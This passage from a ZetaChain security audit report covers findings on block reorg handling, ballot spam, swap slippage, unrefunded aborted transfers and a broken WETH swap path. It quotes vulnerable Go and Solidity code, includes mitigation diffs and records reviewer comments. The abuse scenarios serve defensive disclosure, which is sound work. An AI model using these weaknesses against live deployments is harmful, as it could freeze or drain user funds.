Though, even if we consider that chances of reorgs past those confirmation numbers are low, they occur. And when they do occur beyond the expected safety parameters, and depending on the reorg depth, ZetaChain cannot possibly avoid the resultant financial damage. But there must be a plan in place and critical functions available to deal with the necessary actions to guarantee operational continuity. And none could be found. There is only a keeper function [`RemoveBlockHeader`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/block_header.go#L37), but, oddly, this is not used anywhere in the codebase.

Currently, ZetaChain cannot operate normally if there is need to remove or reorganise some block(s) in the store. For example, suppose there is a reorg beyond the clients' (very minimal) safety parameters and the block headers have already been added. Financial damage may be inevitable, but observers should be able to vote on a solution to the conundrum so ZetaChain can continue to extend its consensus about the connected chains. What happens if observers try to use `AddBlockHeader` to vote in a new version of the chain, by attempting to add a block header for the height that has just been added? The function will return an error:

*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_add_block_header.go#L57C1-L59C4>

```go
		if msg.Height != bhs.LatestHeight+1 {
			return nil, cosmoserrors.Wrap(types.ErrNoParentHash, fmt.Sprintf("invalid block height: wanted %d, got %d", bhs.LatestHeight+1, msg.Height))
		}
```

While most checks will pass, the check that the block header being added is of height equal to latest height plus one will not, and the block will not be added. There are a couple of hacky ways to force the block to be added with wrong parameters. But that would not be a seriously designed remediation measure. Fundamentally, operations regarding the affected chain will be halted.

### Recommended Mitigation Steps

There **must** be a function, be it through observers voting or admin group action, to account for the possible reorganisation of the chain.

The `RemoveBlockHeader` function may be used:

*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/block_header.go#L36C1-L40C2>

```go
// RemoveBlockHeader removes a block header from the store
func (k Keeper) RemoveBlockHeader(ctx sdk.Context, hash []byte) {
	store := prefix.NewStore(ctx.KVStore(k.storeKey), types.KeyPrefix(types.BlockHeaderKey))
	store.Delete(hash)
}
```

Though, there must be a logic somewhere, maybe in the `RemoveBlockHeader` message server's function, to also take care of the `BlockHeaderState` when a block is removed from the store.

Alternatively, altere the `AddBlockHeader` to accept voting for an earlier height, so the block headers can be reorganised to mirror the chain reorg.

**[ciphermarco (Warden) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542#issuecomment-1888829952):**
> The point of my issue is that there's nothing implemented for re-organising blocks in case of need. Neither of the keeper functions `RemoveBlockHeader` and  [`SetBlockHeader`](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542#issuecomment-1865344174)  are exposed by the message server to be used by the consensus operations to swap blocks in the storage in case of reorgs.
> 
> This is also not a theoretical issue about the impact of very specific or deep reorgs types. Small reorgs are inevitable and a normal occurrence in this case, and the core of the issue is that there is no implemented way for peers to cope with that and reach consensus for a new tip block. More specifically, as presented above, `AddBlockHeader` only allows new blocks to be one above the latest block's height (`msg.Height != bhs.LatestHeight+1`), completely blocking any attempt to reach consensus for a new tip.
> 
> Thank you for reviewing this.

**[brewmaster012 (ZetaChain) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542#issuecomment-1894389513):**
 > Thanks for the report. This is a valid issue however the severity/impact is low as we do not currently rely on block headers and there is no path of exploit. 

**[ciphermarco (Warden) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542#issuecomment-1896479382):**
> > we do not currently rely on block headers
> 
> Without trying to infer intentions from the code itself, the [Important Areas documentation](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/docs/important-areas.md#2---permissionless-tx-validation-model) for this audit reads:
> 
> > A new architecture has been developed in order to validate txs from external chains permissionlessly instead of requiring observers to vote on each of them.
> > * Observer votes on block headers of the external chains instead of the txs. The block headers are stored on-chain on ZetaChain
> > * An inbound/outbound tx can be sent by anyone with a proof. The proof is checked against the header of the chain to validate it
> 
> I think the documentation disagrees with this statment and that's all I can fairly work with for the audit. Of course, unless I misunderstood the documentation.
> 
> >  there is no path of exploit
> 
> There are " hypothetical attack paths with stated assumptions, but external requirements.", but I don't show any in my report, so I will not argue for them now. I was focusing on the more easily provable type of impact in this issue, as highlighted below:
> 
> > 2 — Med: ~Assets not at direct risk, but~ **the function of the protocol or its availability could be impacted**, ~or leak value with a hypothetical attack path with stated assumptions, but external requirements.~
> 
> I separated the concepts with the comma and didn't think impacting the function of the protocol or its availability needed to show an attack path besides proving a real risk. Given that reorgs are a normal occurrence, the protocol cannot respond to network realities with this limitation, making the risk real and inevitable.
> 
> But I agree there's no attack path presented in my report and, if that makes it QA, the rule is the rule and thank you for the fair judging.
> 
> Quick edit: I was studying the issues selected for report and I see some of the M's don't have a "path of exploit" or "attack path" shown. Is that really a requirement? Thank you and no more edits or comments :+1: .

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/542#issuecomment-1898484069):**
 > Going to go with Medium on this one. 
> 
> It does show that the new architecture is flawed when dealing with larger re-orgs, and I also do think that it would break the ability for the trust-less proofs to be verified against the header.

***

## [[M-05] Limited Voting Options Allow Ballot Creation Spam](https://github.com/code-423n4/2023-11-zetachain-findings/issues/536)
*Submitted by ciphermarco ([1](https://github.com/code-423n4/2023-11-zetachain-findings/issues/536), [2](https://github.com/code-423n4/2023-11-zetachain-findings/issues/539)), also found by [deliriusz](https://github.com/code-423n4/2023-11-zetachain-findings/issues/502), and [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/223)*

The message functions for certain types of voting allow only successful observation votes. This creates a problem if a compromised or faulty observer creates spam ballots with false observations. In this situation, honest observers have to spend resources processing the ballot but cannot cast an opposite vote to slash the spammer when the ballot reaches maturity.

Theoritically, a similar situation could happen with all ballots that do not reach the threshold. But in non-vulnerable cases, honest observer **can** cast an opposite vote to make the ballot reach threshold and be accounted for slashing. The real issue comes when honest observers **cannot** cast the honest opposite vote.

### Proof of Concept

For certain types of votes, the only vote that is possible to be cast is an `VoteType_SuccessObservation`.

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L95>

```go
ballot, err = k.zetaObserverKeeper.AddVoteToBallot(ctx, ballot, msg.Creator, observerTypes.VoteType_SuccessObservation)
```

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_add_blame_vote.go#L39>

```go
ballot, err = k.AddVoteToBallot(ctx, ballot, vote.Creator, types.VoteType_SuccessObservation)
```

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/keeper/msg_server_add_block_header.go#L79>

```go
ballot, err = k.AddVoteToBallot(ctx, ballot, msg.Creator, types.VoteType_SuccessObservation)
```

A compromised or faulty observer can then create ballots for spam observations that do not exist, and honest observers can never vote for the opposite option. Since the ballot's threshold will never be reached, the ballot will remain with the status `BallotStatus_BallotInProgress`.

Eventually, the ballot will be processed when the `DistributeObserverRewards` function gathers the list of matured ballots.

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/emissions/abci.go#L63>

```go
ballotIdentifiers := keeper.GetObserverKeeper().GetMaturedBallotList(ctx)
```

But, since `BuildRewardsDistribution` does not account for ballots with status `BallotStatus_BallotInProgress`, the ballot spammer will have a `totalRewardUnits == 0` instead of a negative value. This way, no slashing will be executed as a punishment for the false observation, but observers will have to process the spam observation ballot anyway.

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/observer/types/ballot.go#L77-L102>

```go
func (m Ballot) BuildRewardsDistribution(rewardsMap map[string]int64) int64 {
	totalRewardUnits := int64(0)
	switch m.BallotStatus {
	case BallotStatus_BallotFinalized_SuccessObservation:
// ... SNIP ...
	case BallotStatus_BallotFinalized_FailureObservation:
// ... SNIP ...
return totalRewardUnits
```

The compromised observer is then free to create as many false observation ballots as he wishes, effectively spamming the network and draining honest observer's resources without a punishment.

### Additional Note

Besides wasting network participant's execution resources, the ballots are never deleted from storage after the distribution. But there is a comment evidencing this is an obviously known issue and, thus, included as merely a reminder in this report.

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/emissions/abci.go#L127C1-L128C50>

```go
	// TODO : Delete Ballots after distribution
	// https://github.com/zeta-chain/node/issues/942
```

### Recommended Mitigation Steps

Similarly to what happens in other types of votes, allow honest observers to cast a negative observation vote if they wish. Thus, when the ballot reaches maturity and is processed for reward distribution, the dishonest or faulty observer is slashed to pay for any resources spent with the false observation.

This is how `msg_tss_voter.go` and `keeper_cross_chain_tx_vote_outbound_tx.go` work:

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/msg_tss_voter.go#L68C1-L78C3>

```go
	if msg.Status == common.ReceiveStatus_Success {
		ballot, err = k.zetaObserverKeeper.AddVoteToBallot(ctx, ballot, msg.Creator, observerTypes.VoteType_SuccessObservation)
		if err != nil {
			return &types.MsgCreateTSSVoterResponse{}, err
		}
	} else if msg.Status == common.ReceiveStatus_Failed {
		ballot, err = k.zetaObserverKeeper.AddVoteToBallot(ctx, ballot, msg.Creator, observerTypes.VoteType_FailureObservation)
		if err != nil {
			return &types.MsgCreateTSSVoterResponse{}, err
		}
	}
```

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L105C1-L108C3>

```go
	ballot, err = k.zetaObserverKeeper.AddVoteToBallot(ctx, ballot, msg.Creator, observerTypes.ConvertReceiveStatusToVoteType(msg.Status))
	if err != nil {
		return nil, err
	}
```

Special attention must be give to ensure the corrected voting type's Digest function output is generalised for all types of votes. Similarly to what is done with `MsgVoteOnObservedOutboundTx`.

*   <https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/types/message_vote_on_observed_outbound_tx.go#L76C1-L86C2>

```go
func (msg *MsgVoteOnObservedOutboundTx) Digest() string {
	// ... SNIP ...
	// Set status to ReceiveStatus_Created to make sure both successful and failed votes are added to the same ballot
	m.Status = common.ReceiveStatus_Created
	// ... SNIP ...
```

**[lumtis (ZetaChain) acknowledged](https://github.com/code-423n4/2023-11-zetachain-findings/issues/536#issuecomment-1896280554)**

***

## [[M-06] `PayGasFeeInZetaAndUpdateCctx()` is prone to slippage, causing sender overpays the revert gas and lose returned funds](https://github.com/code-423n4/2023-11-zetachain-findings/issues/507)
*Submitted by [oakcobalt](https://github.com/code-423n4/2023-11-zetachain-findings/issues/507), also found by [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/577), [deliriusz](https://github.com/code-423n4/2023-11-zetachain-findings/issues/495), [QiuhaoLi](https://github.com/code-423n4/2023-11-zetachain-findings/issues/480), and [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/180)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L321> <br><https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L292>

UniswapV2 swap on zetaChain is used in multiple flows where the protocol will swap either zeta or ERC20 token to gas erc20 token to pay for outbound tx gas. However, there is no slippage protection for the swapping transaction which makes the process of charging gas fees slippage-prone, easily causing the sender to overpay the revert gas and lose returned funds.

### Proof of Concept

When an outbound tx is initiated whether as a revert tx or diverted outbound tx, `PayGasAndUpdateCctx()` on gas_payment.go will be called. Based on `CointType`, `PayGasAndUpdateCctx()` divert the flow into different process that swaps either zeta token or ERC20 token into gas token of the external chain to pay for revert or outbound gas.

For example, `CointType` is zeta coin. `PayGasInZetaAndUpdateCctx()` will be called, which will first calculate gas token amount needed based on the external chainId. Then it first calls `QueryUniswapV2RouterGetZetaAmountsIn()` which query `wzeta/gasZRC20` uniswapv2 pool for zeta token amount (`outTxGasFeeInZeta`) needed to swap out `outTxGasFee.BigInt()` amount of gasZRC20 token. Then it will call `CallUniswapV2RouterSwapExactETHForToken()` with exact input `outTxGasFeeInZeta` amount.

The above is problematic because after `QueryUniswapV2RouterGetZetaAmountsIn()`, there is no check to ensure the quoted input token amount `outTxGasFeeInZeta` is acceptable within a certain slippage parameter. When there is significant slippage in the uniswapV2 pool before protocol's `PayGasInZetaAndUpdateCctx()` call, gasZRC20 token price in zeta amount will be inflated,causing gas overcharged.

When gas is overcharged, (1) this either cause `feeInZeta.GT(zetaBurnt) == true` which means sender doesn't have enough zeta token to burn, which directly return an error, which might cause a revert cctx to be aborted and sender will lose all refunds. (2) Or if `feeInZeta.GT(zetaBurnt) == false`, sender's zeta balance will be substracted by inflated gas payment, and the sender is overcharged.

```go
//x/crosschain/keeper/gas_payment.go
func (k Keeper) PayGasInZetaAndUpdateCctx(
	ctx sdk.Context,
	chainID int64,
	cctx *types.CrossChainTx,
	zetaBurnt math.Uint,
	noEthereumTxEvent bool,
) error {
...
// get the gas fee in Zeta using system uniswapv2 pool wzeta/gasZRC20 and adding the protocol fee
//@audit this quote the price of gasZRC20 in zeta denomination. There is no slippage check to ensure `outTxGasFeeInZeta` is not inflated. 
|>	outTxGasFeeInZeta, err := k.fungibleKeeper.QueryUniswapV2RouterGetZetaAmountsIn(ctx, outTxGasFee.BigInt(), gasZRC20)
...
feeInZeta := types.GetProtocolFee().Add(math.NewUintFromBigInt(outTxGasFeeInZeta))
//@audit-info when feeInZeta.GT(zetaBurnt)==true, sender doesn't have enough zeta to pay for gas, this return error, if the cctx is revert tx, this will abort and sender will lose all refunds
	if feeInZeta.GT(zetaBurnt) {
		return cosmoserrors.Wrap(types.ErrNotEnoughZetaBurnt, fmt.Sprintf("feeInZeta(%s) more than zetaBurnt (%s) | Identifiers : %s ",
			feeInZeta,
			zetaBurnt,
			cctx.LogIdentifierForCCTX()),
		)
	}
...
//@audit-info when feeInZeta.GT(zetaBurnt)==false, this substract user zeta balance. Sender might be overcharged for gas due to slippage.
	newAmount := zetaBurnt.Sub(feeInZeta)
...
//@audit This is directly execute the swap based on previous quote amount, slippage will be realized here.
|>	amounts, err := k.fungibleKeeper.CallUniswapV2RouterSwapExactETHForToken(
			ctx,
			types.ModuleAddressEVM,
			types.ModuleAddressEVM,
			outTxGasFeeInZeta,
			gasZRC20,
			noEthereumTxEvent,
		)
...
```

(<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L292>)

As seen above, any price of gasZRC20 will be accepted during gas payment, will directly result in either user losing the entire refund or user overpaying for gas. I consider this medium severity.

### Recommended Mitigation Steps

Check and handle slippage case. For example, when `QueryUniswapV2RouterGetZetaAmountsIn()` returns an overinflated value due to slippage, return gas payment flow with a slippage error, and handle slippage error in the corresponding vote inbound/outbound tx flow to allow for pending cctx instead of direct abort.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/507#issuecomment-1877392392)**

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/507#issuecomment-1880162875):**
 > Can see this qualifying as a leak of value and therefore warranting M severity. 

***

## [[M-07] User not refunded for failed Zeta gas payment in cross chain transaction](https://github.com/code-423n4/2023-11-zetachain-findings/issues/504)
*Submitted by [deliriusz](https://github.com/code-423n4/2023-11-zetachain-findings/issues/504), also found by [oakcobalt](https://github.com/code-423n4/2023-11-zetachain-findings/issues/540), [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/221), and [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/207)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L169-L185> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L191-L201> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L215-L239>

### Vulnerability details

When observed CCTX (cross chain transaction) gathers enough votes in VoteOnObservedInboundTx, it is being processed immediately. In case that the transaction is reverted for whatever reason, it returns an error and changes CCTX status to `CctxStatus_Aborted` - such a transaction won't be processed:

```go
			if err != nil {
				// do not commit anything here as the CCTX should be aborted

				// gas payment for erc20 type might fail because no liquidity pool is defined to swap the zrc20 token into the gas token
				// in this gas we should refund the sender on ZetaChain
				if cctx.InboundTxParams.CoinType == common.CoinType_ERC20 {

					if err := k.RefundAmountOnZetaChain(ctx, cctx, cctx.InboundTxParams.Amount); err != nil {
						// log the error
						k.Logger(ctx).Error("failed to refund amount of aborted cctx on ZetaChain",
							"error", err,
							"sender", cctx.InboundTxParams.Sender,
							"amount", cctx.InboundTxParams.Amount.String(),
						)
					}
				}

				cctx.CctxStatus.ChangeStatus(types.CctxStatus_Aborted, err.Error())
				return &types.MsgVoteOnObservedInboundTxResponse{}, nil
```

There is also no mechanism for retrieving the funds back. TSS could probably initialize such a refund, however it required quorum of nodes to do so, and there is no automatic process for this in code in scope. Possible issues for transaction errors are numerous, I'll list just some of them that immediately come to my head:

*   too little amount to cover gas fees. Please note that UniswapV2 is used here, and as described in another issue, it doesn't have proper price manipulation protection, meaning that one of the results may be swapping in highly manipulated pool for overly small fee token amount, making the CCTX error out and abort
*   no valid pool for UniswapV2 swap
*   too little gas paid to process the transaction
*   stale gas prices recorded by keepers
*   any issues with gas coin setting in the zetacored

For cross chain swaps it's even worse, because there is no notion of a refund at all, meaning that the funds are frozen:

```javascript
	// [...]
} else { // Cross Chain SWAP
		tmpCtx, commit := ctx.CacheContext()
		err = func() error {
			err := k.PayGasAndUpdateCctx(
				tmpCtx,
				receiverChain.ChainId,
				&cctx,
				cctx.InboundTxParams.Amount,
				false,
			)
			if err != nil {
				return err
			}
			// [...]
		}()
		if err != nil {
			// do not commit anything here as the CCTX should be aborted
			cctx.CctxStatus.ChangeStatus(types.CctxStatus_Aborted, err.Error()) // @audit status changed to "Aborted" without refunding user the money. This refund is partially handled in case of transaction to Zeta
			return &types.MsgVoteOnObservedInboundTxResponse{}, nil
		}
```

### Impact

Temporary or permament freezing of user funds, depending if TSS holders technically are able and willing to refund the funds manually.

### Proof of Concept

1.  User creates cross chain transaction in ZetaChain
2.  The tranasction is reverted, due to Uniswap pool imbalance. Because EVM returns error, the transaction status is changed to  `Aborted`.
3.  The user funds are locked.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/504#issuecomment-1883638836)**

***

## [[M-08] Funds from reverted transaction may be lost/locked ](https://github.com/code-423n4/2023-11-zetachain-findings/issues/498)
*Submitted by [deliriusz](https://github.com/code-423n4/2023-11-zetachain-findings/issues/498), also found by [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/245) and [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/184)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L61-L226> 

### Vulnerability details

When the cross chain transaction is reverted on destination chain, the revert transaction is processed on source chain, and the remaining amount of Zeta tokens, excluding fees is returned to the CCTX sender. According to the code comment in `/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go`:

> If the previous status was `PendingOutbound`, a new revert transaction is
> created. To cover the revert transaction fee, the required amount of tokens
> submitted with the CCTX are swapped using a Uniswap V2 contract instance on
> ZetaChain for the ZRC20 of the gas token of the receiver chain. The ZRC20
> tokens are then
> burned. The nonce is updated. If everything is successful, the CCTX status is
> changed to `PendingRevert`.
>
> If the previous status was `PendingRevert`, the CCTX is aborted.

The flow is:

1.  A cross-chain transaction is generated on the source chain. It's verified and its status is changed to `PendingOutbound`.
2.  The transaction execution is attempted on the destination chain and fails. It is observed by `zetaclient/evm_signer/TryProcessOutTx`, and broadcased:

```go
  // [...]
	} else if send.CctxStatus.Status == types.CctxStatus_PendingRevert {
		logger.Info().Msgf("SignRevertTx: %d => %s, nonce %d, gasprice %d", send.InboundTxParams.SenderChainId, toChain, send.GetCurrentOutTxParam().OutboundTxTssNonce, gasprice)
		tx, err = signer.SignRevertTx( // @audit executes ZetaConnector.onRevert()
			ethcommon.HexToAddress(send.InboundTxParams.Sender),
			big.NewInt(send.OutboundTxParams[0].ReceiverChainId),
			to.Bytes(),
			big.NewInt(send.GetCurrentOutTxParam().ReceiverChainId),
			send.GetCurrentOutTxParam().Amount.BigInt(),
			gasLimit,
			message,
			sendhash,
			send.GetCurrentOutTxParam().OutboundTxTssNonce,
			gasprice,
			height,
		)
  // [...]
	if tx != nil {
			// [...]
			err := signer.Broadcast(tx)
```

3.  In case that this is non-eth revert, [ZetaConnector.non-eth](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L87-L122) is called:

```

        function onRevert(
            address zetaTxSenderAddress,
            uint256 sourceChainId,
            bytes calldata destinationAddress,
            uint256 destinationChainId,
            uint256 remainingZetaValue,
            bytes calldata message,
            bytes32 internalSendHash
        ) external override whenNotPaused onlyTssAddress {
            if (remainingZetaValue + ZetaNonEthInterface(zetaToken).totalSupply() > maxSupply)
                revert ExceedsMaxSupply(maxSupply);
            ZetaNonEthInterface(zetaToken).mint(zetaTxSenderAddress, remainingZetaValue, internalSendHash);

            if (message.length > 0) {
                ZetaReceiver(zetaTxSenderAddress).onZetaRevert(
                    ZetaInterfaces.ZetaRevert(
                        zetaTxSenderAddress,
                        sourceChainId,
                        destinationAddress,
                        destinationChainId,
                        remainingZetaValue,
                        message
                    )
                );
            }
    		// [...]
```

There are 3 possibilities when it may fail:
1. Amount to be minted together with `totalSupply()` is bigger than `maxSupply`
2. `ZetaReceiver(zetaTxSenderAddress).onZetaRevert()` call reverts
3. TSS provides too little gas on purpose, but we assume that it's trused, so it's not really an issue.

If if fails, the transaction state is set to `Aborted` in  [x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L199-L201), and it won't be processed:

    				case types.CctxStatus_PendingRevert:
    					cctx.CctxStatus.ChangeStatus(types.CctxStatus_Aborted, "Outbound failed: revert failed; abort TX")
    				}

In won't be processed again.

And because only [Connector](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/Zeta.non-eth.sol#L62-L71) can mint the tokens, the funds are lost without anyone able to mint them for the user.

Concerning `maxSupply`, it's set to `uint256.max` during contract creation, however it's adjustable by [TSS to any value](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L31-L34):

```javascript
    function setMaxSupply(uint256 maxSupply_) external onlyTssAddress {
        maxSupply = maxSupply_;
        emit MaxSupplyUpdated(msg.sender, maxSupply_);
    }
```

### Impact

User funds lost in case that revert transaction reverts on source chain.

### Proof of Concept

Let's take following example:

1.  User creates a cross chain transaction, to sends 10\_000&#36; worth of ZRC20 cross chain using ZetaChain. He posts a transaction to `ZetaConnectorNonEth.send()`, which creates cross chain transaction.
2.  The transaction is reverted on destination chain. Hence new state `PendingRevert` is added to the transaction and awaits to be processed on the source chain.
3.  `ZetaConnectorNonEth.onRevert()` is called on source chain. It reverts and cross chain transaction state is set to `Aborted`.
4.  The funds are burned on source chain, and not minted back, meaning that the funds are lost.

### Recommended Mitigation Steps

1.  Make sure that TSS cannot decrease `maxSupply` over constance `MIN_SUPPLY_CAP` or current `totalSupply()`

```diff
    function setMaxSupply(uint256 maxSupply_) external onlyTssAddress {
+		if(maxSupply < MIN_SUPPLY_CAP) {revert MaxSupplyTooSmall()};
        maxSupply = maxSupply_;
        emit MaxSupplyUpdated(msg.sender, maxSupply_);
    }
```

2.  Handle this case gracefully - consider not aborting the transaction in case of revert transaction failure, or add some kind of "voucher" that the user can redeem manually.

**[lumtis (Zetachain) confirmed via duplicate Issue #245](https://github.com/code-423n4/2023-11-zetachain-findings/issues/245#event-11388717102)**

***

## [[M-09] Direct WETH swap fails due to incompatibility with ``ZetaTokenConsumerUniV3`` & ``ZetaTokenConsumerPancakeV3``](https://github.com/code-423n4/2023-11-zetachain-findings/issues/422)
*Submitted by [Josephdara\_0xTiwa](https://github.com/code-423n4/2023-11-zetachain-findings/issues/422)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerUniV3.strategy.sol#L98-L122> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerUniV3.strategy.sol#L158-L182>

User use the `ZetaTokenConsumerUniV3.sol` to get the zeta tokens. Either through ETH or through other ERC20 tokens.
One of the most important tokens in Defi today is the WETH token, all swaps in the codebase to/from ZETA are routed through the ZETA/WETH pool. However this contact, as well as the `ZetaTokenConsumerPancakeV3` and the `ZetaTokenConsumerTrident` do not permit users to swap WETH directly to ZETA.
This is because of an oversight in the swap function that require the existence of a WETH/WETH pool.
As seen below, when the input/output token is WETH, the function will revert:

```solidity
 function getZetaFromToken(
        address destinationAddress,
        uint256 minAmountOut,
        address inputToken,
        uint256 inputTokenAmount
    ) external override returns (uint256) {
        if (destinationAddress == address(0) || inputToken == address(0)) revert ZetaCommonErrors.InvalidAddress();
        if (inputTokenAmount == 0) revert InputCantBeZero();

        IERC20(inputToken).safeTransferFrom(msg.sender, address(this), inputTokenAmount);
        IERC20(inputToken).safeApprove(address(uniswapV3Router), inputTokenAmount);

        ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams({
            deadline: block.timestamp + MAX_DEADLINE,
            path: abi.encodePacked(inputToken, tokenPoolFee, WETH9Address, zetaPoolFee, zetaToken),
            recipient: destinationAddress,
            amountIn: inputTokenAmount,
            amountOutMinimum: minAmountOut
        });
```

### Proof of Concept

From the [Pancake V3 factory](https://github.com/pancakeswap/pancake-smart-contracts/blob/d8f55093a43a7e8913f7730cfff3589a46f5c014/projects/exchange-protocol/contracts/PancakeFactory.sol#L27) and [Uni V3 factory](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Factory.sol#L34-L40) contracts, it is evident that pools cannot be created for a token with itself. Therefore users cannot swap WETH to WETH thereby breaking the path needed to swap WETH to Zeta or vice versa.
In the code base, the issue is present:

*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerPancakeV3.strategy.sol#L138-L145>
*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerPancakeV3.strategy.sol#L195-L203>
*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerTrident.strategy.sol#L111-L128>
*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerTrident.strategy.sol#L178-L197>
*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerUniV3.strategy.sol#L110-L118>
*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaTokenConsumerUniV3.strategy.sol#L170-L178>

### Recommended Mitigation Steps

Implement a check to see if the input/output token is WETH, if so, perform the swap directly between WETH and ZETA without a second swap.

**[josephdara (Warden) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/422#issuecomment-1889615122):**
 > All references stated in the POC section are lines of code in the codebase within scope that require a WETH/WETH pool. 
> 
> When the Input token is WETH, it attempts to first swap to WETH, then to ZETA. 
> When the output token is WETH, it first swaps ZETA to WETH, then attempts swapping WETH to WETH. 
> 
> This was explained above with all the points that this happened listed in the POC section.

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/422#issuecomment-1892340182):**
 > More evidence would certainly have been welcomed, but I follow the wardens belief that this would cause an issue when attempting to call `getZetaFromToken()` and the input is WETH.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/422#issuecomment-1896284626)**

***

## [[M-10] A single malicious observer can exploit the infinite gas meter to grief ZetaChain blocks without proper gas compensation](https://github.com/code-423n4/2023-11-zetachain-findings/issues/410)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/410)*

ZetaChain blocks can be griefed by a single observer, possibly preventing other transactions from being processed.

### Proof of Concept

A Cosmos SDK app's ante handler verifies transactions (gas, messages,..) before further processing and before the individual messages are passed onto the respective handlers.

